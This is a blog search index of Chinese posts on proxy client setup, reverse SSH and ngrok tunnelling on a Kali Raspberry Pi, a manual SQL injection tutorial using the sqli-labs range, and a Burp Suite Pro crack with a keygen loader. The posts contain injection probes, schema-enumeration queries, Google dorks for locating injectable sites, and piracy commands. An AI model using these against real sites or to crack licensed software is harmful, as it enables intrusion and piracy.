<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>linux版qv2ray安装</title>
    <url>/2020/08/27/linux%E7%89%88qv2ray%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>在国内有的网络技术文档都已经很老了，在外国能查看到新的互联网技术进行学习<br>废话不多说</p>
<ol>
<li>下载V2ray客户端<br> 应为github下载的比较慢，我下载好的放到了蓝奏云里面，蓝奏云下载的快<br> <a href="https://wwa.lanzous.com/iIatmf0cmqf">https://wwa.lanzous.com/iIatmf0cmqf</a><br> 更多其他系统版本<br> <a href="https://github.com/Qv2ray/Qv2ray/releases/tag/v1.99.6">https://github.com/Qv2ray/Qv2ray/releases/tag/v1.99.6</a></li>
<li>下载核心<br> 应为github下载的比较慢，我下载好的放到了蓝奏云里面，蓝奏云下载的快<br> <a href="https://wwa.lanzous.com/ixPOUf0cpyb">https://wwa.lanzous.com/ixPOUf0cpyb</a><br> 更多其他系统版本<br> <a href="https://github.com/v2fly/v2ray-core/releases">https://github.com/v2fly/v2ray-core/releases/</a></li>
</ol>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>我创建了一个v2ray文件夹里面是解压好的下载的核心和V2ray客户端<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200726184523611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ol>
<li><p>然后在终端输入运行<br> 给他执行权限</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod +x .&#x2F;Qv2ray.v2.6.2.linux-x64.AppImage	 </span><br></pre></td></tr></table></figure>
<p> 运行</p>
</li>
</ol>
<pre><code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;Qv2ray.v2.6.2.linux-x64.AppImage	 </span><br></pre></td></tr></table></figure></code></pre>
<ol start="2">
<li>设置<br> 设置中文<br> 他默认是英文的<img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200726192820628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ol>
<p><strong>添加核心</strong><br>上面下载的核心文件里面的执行文件<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200726194038573.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>添加上面解压出来了的核心文件的根目录<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020072619422713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>代理</category>
      </categories>
      <tags>
        <tag>客户端代理</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派，反向ssh，内网通过公网访问到其他内网</title>
    <url>/2020/08/27/%E6%A0%91%E8%8E%93%E6%B4%BE%EF%BC%8C%E5%8F%8D%E5%90%91ssh%EF%BC%8C%E5%86%85%E7%BD%91%E9%80%9A%E8%BF%87%E5%85%AC%E7%BD%91%E8%AE%BF%E9%97%AE%E5%88%B0%E5%85%B6%E4%BB%96%E5%86%85%E7%BD%91/</url>
    <content><![CDATA[<h2 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h2><h2 id="简单说"><a href="#简单说" class="headerlink" title="简单说"></a>简单说</h2><p>a内网，b公网，c内网<br>在c内网怎么访问到a的内网里面，就和访问c内网其他主机一样？<br> 我研究了好长时间问过学习过10多年的大佬，还有其他厉害的大佬，其他人给的建议，和书籍还有百度，下面我就进行一下内网穿透，反向隧道，<br> 应为我的笔记本内网穿透没有什么太大的用处 ，可以用花生壳内网穿透很简单。就不多说了<br> 都是树莓派就不行了，如果进行，没有远程ssh就不行了，不能进行渗透测试，<br> 开始操作<br>在《树莓派渗透实战》书说的如果从外网访问内网，是访问不了的，反向ssh隧道从内网就可以做到<br>内网执行的命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -fN -R 5555:localhost:22  root@公网ip</span><br></pre></td></tr></table></figure>

<p>服务器执行的命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@localhost -p5555</span><br></pre></td></tr></table></figure>

<h2 id="树莓派安装的是kali-linux系统-安装花生壳树莓派，"><a href="#树莓派安装的是kali-linux系统-安装花生壳树莓派，" class="headerlink" title="树莓派安装的是kali linux系统 安装花生壳树莓派，"></a>树莓派安装的是kali linux系统 安装花生壳树莓派，</h2><p>花生壳地址<a href="https://hsk.oray.com/download/">https://hsk.oray.com/download/</a><br>应为树莓派我安装的arm64位的，他只有32位的，安装不上<br>下面命令对32位的支持</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dpkg --add-architecture armhf</span><br></pre></td></tr></table></figure>
<p>反正还是安装不是，不知道怎么回事<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200604210928493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="树莓派用Sunny-Ngrok内网穿透"><a href="#树莓派用Sunny-Ngrok内网穿透" class="headerlink" title="树莓派用Sunny-Ngrok内网穿透"></a>树莓派用Sunny-Ngrok内网穿透</h2><p>官方<a href="http://www.ngrok.cc/">http://www.ngrok.cc/</a><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020060421113237.png" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;sunny clientid  隧道id</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200604211248679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>自启动<a href="http://www.ngrok.cc/">http://www.ngrok.cc/</a>官方说明</p>
<h2 id="1、下载客户端"><a href="#1、下载客户端" class="headerlink" title="1、下载客户端"></a>1、下载客户端</h2><p>这一步就都不用说了大家都知道怎么操作。下载完成之后将客户端执行文件移动到 /use/local/bin 目录下并给予可执行权限。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo mv sunny &#x2F;usr&#x2F;local&#x2F;bin&#x2F;sunny</span><br><span class="line">sudo chmod +x &#x2F;usr&#x2F;local&#x2F;bin&#x2F;sunny</span><br></pre></td></tr></table></figure>
<h2 id="2、编写启动脚本"><a href="#2、编写启动脚本" class="headerlink" title="2、编写启动脚本"></a>2、编写启动脚本</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo vim &#x2F;etc&#x2F;init.d&#x2F;sunny 启动脚本代码</span><br></pre></td></tr></table></figure>
<p>把代码里面的【隧道id】替换成自己的隧道id</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh -e</span><br><span class="line">### BEGIN INIT INFO</span><br><span class="line"># Provides:          ngrok.cc</span><br><span class="line"># Required-Start:    $network $remote_fs $local_fs</span><br><span class="line"># Required-Stop:     $network $remote_fs $local_fs</span><br><span class="line"># Default-Start:     2 3 4 5</span><br><span class="line"># Default-Stop:      0 1 6</span><br><span class="line"># Short-Description: autostartup of frp for Linux</span><br><span class="line">### END INIT INFO</span><br><span class="line"></span><br><span class="line">NAME&#x3D;sunny</span><br><span class="line">DAEMON&#x3D;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;$NAME</span><br><span class="line">PIDFILE&#x3D;&#x2F;var&#x2F;run&#x2F;$NAME.pid</span><br><span class="line"></span><br><span class="line">[ -x &quot;$DAEMON&quot; ] || exit 0</span><br><span class="line"></span><br><span class="line">case &quot;$1&quot; in</span><br><span class="line">  start)</span><br><span class="line">      if [ -f $PIDFILE ]; then</span><br><span class="line">        echo &quot;$NAME already running...&quot;</span><br><span class="line">        echo -e &quot;\033[1;35mStart Fail\033[0m&quot;</span><br><span class="line">      else</span><br><span class="line">        echo &quot;Starting $NAME...&quot;</span><br><span class="line">        start-stop-daemon -S -p $PIDFILE -m -b -o -q -x $DAEMON -- clientid 隧道id || return 2</span><br><span class="line">        echo -e &quot;\033[1;32mStart Success\033[0m&quot;</span><br><span class="line">    fi</span><br><span class="line">    ;;</span><br><span class="line">  stop)</span><br><span class="line">        echo &quot;Stoping $NAME...&quot;</span><br><span class="line">        start-stop-daemon -K -p $PIDFILE -s TERM -o -q || return 2</span><br><span class="line">        rm -rf $PIDFILE</span><br><span class="line">        echo -e &quot;\033[1;32mStop Success\033[0m&quot;</span><br><span class="line">    ;;</span><br><span class="line">  restart)</span><br><span class="line">    $0 stop &amp;&amp; sleep 2 &amp;&amp; $0 start</span><br><span class="line">    ;;</span><br><span class="line">  *)</span><br><span class="line">    echo &quot;Usage: $0 &#123;start|stop|restart&#125;&quot;</span><br><span class="line">    exit 1</span><br><span class="line">    ;;</span><br><span class="line">esac</span><br><span class="line">exit 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="3、测试可执行代码"><a href="#3、测试可执行代码" class="headerlink" title="3、测试可执行代码"></a>3、测试可执行代码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo chmod 755 &#x2F;etc&#x2F;init.d&#x2F;sunny</span><br><span class="line">sudo &#x2F;etc&#x2F;init.d&#x2F;sunny start</span><br><span class="line">sudo &#x2F;etc&#x2F;init.d&#x2F;sunny start    #启动</span><br><span class="line">sudo &#x2F;etc&#x2F;init.d&#x2F;sunny stop     #停止</span><br><span class="line">sudo &#x2F;etc&#x2F;init.d&#x2F;sunny restart  #重启</span><br></pre></td></tr></table></figure>
<h2 id="4、设置开机启动"><a href="#4、设置开机启动" class="headerlink" title="4、设置开机启动"></a>4、设置开机启动</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cd /etc/init.d</span><br><span class="line">sudo update-rc.d sunny defaults <span class="number">90</span>    <span class="comment">#加入开机启动</span></span><br><span class="line">sudo update-rc.d -f sunny remove  <span class="comment">#取消开机启动</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020060422195522.png" alt="在这里插入图片描述"></p>
<h2 id="QQ2737977997"><a href="#QQ2737977997" class="headerlink" title="QQ2737977997"></a>QQ2737977997</h2>]]></content>
      <categories>
        <category>内网穿透</category>
      </categories>
      <tags>
        <tag>隧道</tag>
      </tags>
  </entry>
  <entry>
    <title>1. 网易web安全渗透  手动sql注入</title>
    <url>/2020/08/27/1.%20%E7%BD%91%E6%98%93web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%20%20%E6%89%8B%E5%8A%A8sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><ol>
<li><p>靶场环境搭建</p>
<p> 环境环境搭建服务器软件是phpstudy下载地址<a href="https://www.xp.cn/">https://www.xp.cn/</a><br> 靶场是sqli-labs下载地址是<a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a><br> 配置sqli-labs的sql密码<br> <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200719151133673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p> 用php5和mysql5.7<br> <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020071915101782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p> 成功<br> <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200719153932929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在1这里插入图片描述"></p>
</li>
</ol>
<ol start="2">
<li><p>注入的常用的函数</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select system_user();      系统用户名 </span><br><span class="line">select  user(); 　　当前数据库用户名</span><br><span class="line">select  current_user(); 　　当前用户名</span><br></pre></td></tr></table></figure>


</li>
</ol>
<pre><code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select  database();  返回当前使用的数据库</span><br></pre></td></tr></table></figure>

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200623084124884.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70)


<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select	version() mysql; 　　数据库版本</span><br><span class="line">select @@datadir;     数据库路径</span><br><span class="line">select @@basedir;  数据库安装路径</span><br><span class="line">select @@global.version_compile_os;  操作系统的信息</span><br></pre></td></tr></table></figure></code></pre>
<ol start="3">
<li>寻找注入点<br> 无特定目标 </li>
</ol>
<pre><code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">inurl:php?id&#x3D;</span><br></pre></td></tr></table></figure>
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200623090208938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70)
有特定目标
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">inurl:php?id&#x3D;site:xxxx.com</span><br></pre></td></tr></table></figure>
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200623090405991.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70)</code></pre>
<h2 id="检查注入点"><a href="#检查注入点" class="headerlink" title="检查注入点"></a>检查注入点</h2><ol>
<li><p>手工简单识别</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">and 1=1/ and 1=2</span><br><span class="line">and&quot;1=1/and&quot;1=2</span><br><span class="line">and 1 like 1/and 1 like 2</span><br></pre></td></tr></table></figure></li>
<li><p>工具识别</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -m   要指定的文件     多个目标URL保持到文件里-m就会用文件里的</span><br><span class="line">sqlmap --craw    sqlmap对目标网站进行爬取然后依次进行测试</span><br></pre></td></tr></table></figure>


</li>
</ol>
<h2 id="mysql手动注入"><a href="#mysql手动注入" class="headerlink" title="mysql手动注入"></a>mysql手动注入</h2><ol>
<li>mysql结构<br> mysql内库<br> <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200719142556272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>核心原理:<br>MySq内置的 Information schema库,它功能强大,是我们进行MySq注入的基石!<br>通过 information schema我们可以窥透整个 MySQL的运行情况,也可以查看到数据库中所有的数据信息。</li>
</ol>
<ol start="3">
<li><p>查询数据库核心语法</p>
<table>
<thead>
<tr>
<th align="center">功能名称</th>
<th align="right">查询语句</th>
</tr>
</thead>
<tbody><tr>
<td align="center">查库</td>
<td align="right">select schema_name from information_schema.schemata</td>
</tr>
<tr>
<td align="center">查表</td>
<td align="right">select table_name from information_schema.tables where table_schema=’库名’</td>
</tr>
<tr>
<td align="center">查列</td>
<td align="right">select column_name from information_schema.columns where table_name=’列名’;</td>
</tr>
<tr>
<td align="center">查数据</td>
<td align="right">select 列名 from 库名.表名</td>
</tr>
</tbody></table>
<h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p>   <strong>1.查库</strong><br>   <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200719150848459.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
</ol>
<p><strong>2.查表</strong><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200719154201445.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>3.查列</strong><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200719154345793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以不输入单引号<br>比如<code>&#39;users&#39;</code>列名转换成哈希<code>7573657273</code><br>步骤<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200719155359180.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200719155412516.png" alt="在这里插入图片描述"><br>然后在语句里面输入<code>0x和上面生成出来的哈希</code><br>意思<br>0x是告诉我是16进行的<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200719155656713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ol start="4">
<li>提示</li>
</ol>
<pre><code> **提示1**:
 所有类型的sql注入，都是基于査库、表、列语句     

**提示2**:
sql注入，都是基于査库、表、列语句  
査询的场緊：可利用limit限定返回的数置及位置，依次査询</code></pre>
<p>回显数据的场聚：<em>concat</em>链接多个数据成为一条返回结果<br>咧<br>    1. limit函数<br>上面的这个limit，下面是他的演示，就是叫修改就可以查看其他的行<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020071917081938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>    2. group_concat()函数<br>    他可以叫多个列组合到一个里面，应为sql注入，可能输出的有限制，<br>    找个函数就是，叫内容都输出的一个里面<br>    咧</p>
<pre><code>    ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200719174303407.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70)



**提示3:**.
在一些场景，想要快速获取数据，需要接住工具，如：burp</code></pre>
<h2 id="靶场是sqli-labs进行手动sql注入1-4到这个地方：Sqli-labs-Less1-4关卡"><a href="#靶场是sqli-labs进行手动sql注入1-4到这个地方：Sqli-labs-Less1-4关卡" class="headerlink" title="靶场是sqli-labs进行手动sql注入1-4到这个地方：Sqli-labs Less1-4关卡"></a>靶场是sqli-labs进行手动sql注入1-4到这个地方：<a href="https://blog.csdn.net/qq_41860876/article/details/107405426">Sqli-labs Less1-4关卡</a></h2>]]></content>
      <categories>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>网易web安全渗透  手动sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>kali2020教程Burpsuite破解汉化版安装</title>
    <url>/2020/08/27/kali2020%E6%95%99%E7%A8%8BBurpsuite%E7%A0%B4%E8%A7%A3%E6%B1%89%E5%8C%96%E7%89%88%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<p>BurpSuite<br>废话不多说正题</p>
<ol>
<li><p>下载<br>下面是我提供的下载版本和工具<br>[Burp Suite2.0.1.1版]<a href="https://pan.baidu.com/s/1EyD0kYTE2K5EH46sYB6e3A">https://pan.baidu.com/s/1EyD0kYTE2K5EH46sYB6e3A</a>提取码：t3hp<br>[汉化包]<a href="https://pan.baidu.com/s/1wAHXJwADA7cw3pf_zIKDJQ">https://pan.baidu.com/s/1wAHXJwADA7cw3pf_zIKDJQ</a>提取码：b8u0<br>[java ]<a href="https://pan.baidu.com/s/1Yo2PlNTAcr-s678cpkiFHw">https://pan.baidu.com/s/1Yo2PlNTAcr-s678cpkiFHw</a>提取码：6346</p>
<ol start="2">
<li>进行配置<br>叫下载好的保存到一个目录里<br>然后解压出来叫下载好的jdk-8u161-linux-x64.tar.gz<br>命令</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">tar -xzvf jdk<span class="number">-8u</span>161-linux-x64.tar.gz</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191104131200946.PNG" alt="在这里插入图片描述"><br>解压好进行配置运行下面的代码<br>1</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> JAVA_HOME=/root/桌面/jdk1<span class="number">.8</span>/</span><br></pre></td></tr></table></figure>
<p>2</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> JRE_HOME=JAVAHOME/jreexportCLASSPATH=.:&#123;JAVA_HOME&#125;/lib:JREHOME/libexportPATH=&#123;JAVA_HOME&#125;/bin:$PATH</span><br></pre></td></tr></table></figure>
<p>3</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">update-alternatives --install /usr/bin/java java /root/桌面/jdk1<span class="number">.8</span>/bin/java <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>4</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">update-alternatives --install /usr/bin/javac javac /root/桌面/jdk1<span class="number">.8</span>/bin/javac <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>5</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">update-alternatives --<span class="built_in">set</span> java /root/桌面/jdk1<span class="number">.8</span>/bin/java</span><br></pre></td></tr></table></figure>
<p>6</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">update-alternatives --<span class="built_in">set</span> java /root/桌面/jdk1<span class="number">.8</span>/bin/java</span><br></pre></td></tr></table></figure>
<p> 7</p>
 <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">update-alternatives --<span class="built_in">set</span> javac /root/桌面/jdk1<span class="number">.8</span>/bin/javac</span><br></pre></td></tr></table></figure>
<p>然后运行</p>
</li>
</ol>
<pre><code><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">java -version</span><br></pre></td></tr></table></figure>
查看配置成功</code></pre>
<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191104132555181.png" alt="在这里插入图片描述"><br>3. 开始破解<br>1.先创建一个a.sh文件<br>文件里面a.sh内容</p>
<pre><code><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">java -jar burp-loader-keygen.ja</span><br></pre></td></tr></table></figure>
![在这里插入图片描述](https://img-blog.csdnimg.cn/20191104140446983.png)
加执行权限


<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">chmod +x a.sh</span><br></pre></td></tr></table></figure>
![在这里插入图片描述](https://img-blog.csdnimg.cn/20191104140551606.png)
然后运行
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">./a,sh</span><br></pre></td></tr></table></figure>
运行后会出现![在这里插入图片描述](https://img-blog.csdnimg.cn/20191104140607834.png)</code></pre>
<p>2.创建一个burp.sh文件<br>文件里面a.sh内容</p>
<pre><code><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">java -Dfile.encoding=utf<span class="number">-8</span> -javaagent:BurpSuiteCn.jar -Xbootclasspath/p:burp-loader-keygen.jar  -Xmx1024m -jar  burpsuite_pro_v2<span class="number">.0</span><span class="number">.11b</span>eta.jar</span><br></pre></td></tr></table></figure>
![在这里插入图片描述](https://img-blog.csdnimg.cn/20191104140820842.png)</code></pre>
<p>加执行权限</p>
<pre><code><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">chmod +x burp.sh</span><br></pre></td></tr></table></figure>
运行


<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">./burp.sh</span><br></pre></td></tr></table></figure>
可以看到是中文的了
![在这里插入图片描述](https://img-blog.csdnimg.cn/20191104141137443.png)</code></pre>
<ol start="3">
<li>安装<br> 下面叫内容复制到里面<pre><code>                 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20191104141229717.png)</code></pre>
<img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191104141306592.png" alt="在这里插入图片描述"><br> <img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2019110414131589.png" alt="在这里插入图片描述"><br>成功<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191104141336122.png" alt="在这里插入图片描述"><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191104141342661.png" alt="在这里插入图片描述"></li>
</ol>
<h1 id="作者QQ2737977997"><a href="#作者QQ2737977997" class="headerlink" title="作者QQ2737977997"></a>作者QQ2737977997</h1>]]></content>
      <categories>
        <category>Burpsuite破解</category>
      </categories>
      <tags>
        <tag>Burpsuite破解</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派安装kali linux和说明</title>
    <url>/2020/08/27/1.%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85kali%20linux%E5%92%8C%E8%AF%B4%E6%98%8E/</url>
    <content><![CDATA[<p><strong>我玩树莓派的经历，自学习网络安全也有好几年了</strong></p>
<p><strong>应为我也是才上职高二年级的一个普通的学生，买树莓派也是考虑了很长时间，毕竟是学生党几百块已经算很贵的了，考虑了很长时间就决定买了一个树莓派</strong>，<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409143416347.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我买的是</p>
<ul>
<li>树莓派4b 4g</li>
<li>32g内存卡和读卡器</li>
<li>电源</li>
<li>壳子</li>
<li>摄像头</li>
</ul>
<h2 id="开始安装kali-linux"><a href="#开始安装kali-linux" class="headerlink" title="开始安装kali linux"></a>开始安装kali linux</h2><p>玩过kali的人，其实在树莓派安装kali很简单的<br>官方下载地址：<a href="https://www.offensive-security.com/kali-linux-arm-images/">https://www.offensive-security.com/kali-linux-arm-images/</a><br><strong>我下载的是这个</strong><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409142019890.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下载完成要解压出来，<br>也可以校验一下是否下载时缺少什么吗<br><strong>记得要叫下载好的文件解压出来</strong><br>用win32diskimager工具可以在百度上下载到<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416125004522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="插入树莓派启动即可"><a href="#插入树莓派启动即可" class="headerlink" title="插入树莓派启动即可"></a>插入树莓派启动即可</h2><p>如果没有屏幕，可以插入网线，</p>
